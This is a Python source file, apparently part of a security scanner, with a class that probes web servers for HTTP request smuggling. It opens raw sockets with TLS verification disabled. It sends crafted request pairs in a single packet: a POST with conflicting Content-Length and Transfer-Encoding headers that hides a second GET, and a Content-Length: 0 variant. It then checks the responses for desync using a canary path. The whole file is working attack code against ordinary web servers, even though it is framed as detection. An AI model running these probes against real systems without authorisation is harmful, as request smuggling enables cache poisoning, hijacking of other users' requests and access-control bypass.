from socket import (IPPROTO_TCP, TCP_NODELAY, create_connection, socket,
                    timeout as SocketTimeout)
from ssl import CERT_NONE, create_default_context
from typing import Dict, List

from lib.canary import CanaryGenerator, split_http_responses, _parse_status_line

try:
    from socket import TCP_CORK
    _HAS_CORK = True
except ImportError:
    _HAS_CORK = False


DRAIN_TIMEOUT = 0.8


class SinglePacketAttack:
    def __init__(self, host: str, port: int, use_tls: bool, timeout: float) -> None:
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.timeout = timeout
        self.canary = CanaryGenerator()

    def _connect(self) -> socket:
        sock = create_connection((self.host, self.port), self.timeout)
        sock.settimeout(self.timeout)
        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        if _HAS_CORK:
            try:
                sock.setsockopt(IPPROTO_TCP, TCP_CORK, 1)
            except OSError:
                pass
        if self.use_tls:
            ctx = create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.host)
        return sock

    def _uncork(self, sock: socket) -> None:
        if _HAS_CORK:
            try:
                sock.setsockopt(IPPROTO_TCP, TCP_CORK, 0)
            except OSError:
                pass

    def _drain(self, sock: socket, window: float = DRAIN_TIMEOUT) -> bytes:
        saved = sock.gettimeout()
        sock.settimeout(window)
        data = b""
        try:
            while True:
                try:
                    chunk = sock.recv(65535)
                except SocketTimeout:
                    break
                except OSError:
                    break
                if not chunk:
                    break
                data += chunk
        finally:
            try:
                sock.settimeout(saved)
            except OSError:
                pass
        return data

    def send_pair(self, req_a: bytes, req_b: bytes) -> Dict[str, object]:
        combined = req_a + req_b
        blob = b""
        closed = False
        sock = None
        try:
            try:
                sock = self._connect()
            except OSError:
                return {"response_count": 0, "responses": [], "raw": b"",
                        "closed": True}
            try:
                sock.sendall(combined)
            except OSError:
                closed = True
            else:
                self._uncork(sock)
                blob = self._drain(sock)
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass
        responses = split_http_responses(blob) if blob else []
        return {"response_count": len(responses), "responses": responses,
                "raw": blob, "closed": closed}

    @staticmethod
    def _parse_status(response: bytes) -> int:
        status = _parse_status_line(response)
        return status if status is not None else -1

    @staticmethod
    def _classify(responses: List[bytes], canary_path: str,
                  canary: CanaryGenerator) -> Dict[str, object]:
        filtered = [r for r in responses
                    if not (100 <= (SinglePacketAttack._parse_status(r) or -1) < 200)]
        if not filtered:
            return {"canary_hit": False, "desync_suspected": False,
                    "pipelines": 0, "response_count": 0,
                    "front_end_reject": False, "needs_escalation": False,
                    "statuses": []}
        flags = [canary.validate(r, canary_path) for r in filtered]
        pipelines = sum(1 for f in flags[:-1] if f)
        victim_hit = bool(flags[-1]) if flags else False
        statuses = [SinglePacketAttack._parse_status(r) for r in filtered]
        victim_status = statuses[-1] if statuses else -1
        victim_is_error = 400 <= victim_status < 600
        desync = (
            victim_hit
            and pipelines == 0
            and len(filtered) >= 2
            and victim_status > 0
            and not victim_is_error
        )
        front_end_reject = (
            len(filtered) == 1 and victim_is_error and not victim_hit
        )
        return {
            "canary_hit": victim_hit,
            "desync_suspected": desync,
            "pipelines": pipelines,
            "response_count": len(filtered),
            "statuses": statuses,
            "front_end_reject": front_end_reject,
            "needs_escalation": front_end_reject and not desync,
        }

    def probe_pipeline_desync(self, endpoint: str, host_header: str) -> Dict[str, object]:
        canary_path = self.canary.new_path()
        smuggled = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        )
        req_a = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n\r\n{smuggled}"
        ).encode("latin-1", errors="replace")
        req_b = (
            f"GET {endpoint}?victim=1 HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        ).encode("latin-1")
        result = self.send_pair(req_a, req_b)
        verdict = self._classify(result["responses"], canary_path, self.canary)
        result.update(verdict)
        result["type"] = "SINGLE_PACKET"
        result["canary_path"] = canary_path
        result["raw"] = req_a
        return result

    def probe_cl0_pair(self, endpoint: str, host_header: str) -> Dict[str, object]:
        canary_path = self.canary.new_path()
        smuggled = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        )
        req_a = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"Content-Length: 0\r\n"
            f"\r\n"
            f"{smuggled}"
        ).encode("latin-1", errors="replace")
        req_b = (
            f"GET {endpoint}?victim=1 HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        ).encode("latin-1")
        result = self.send_pair(req_a, req_b)
        verdict = self._classify(result["responses"], canary_path, self.canary)
        result.update(verdict)
        result["type"] = "SINGLE_PACKET_CL0"
        result["canary_path"] = canary_path
        result["raw"] = req_a
        return result

    def run_all(self, endpoint: str, host_header: str) -> List[Dict[str, object]]:
        results = []
        for fn in (self.probe_pipeline_desync, self.probe_cl0_pair):
            try:
                results.append(fn(endpoint, host_header))
            except OSError:
                results.append({"type": fn.__name__, "error": "connection_failed",
                                "desync_suspected": False,
                                "needs_escalation": False})
        return results
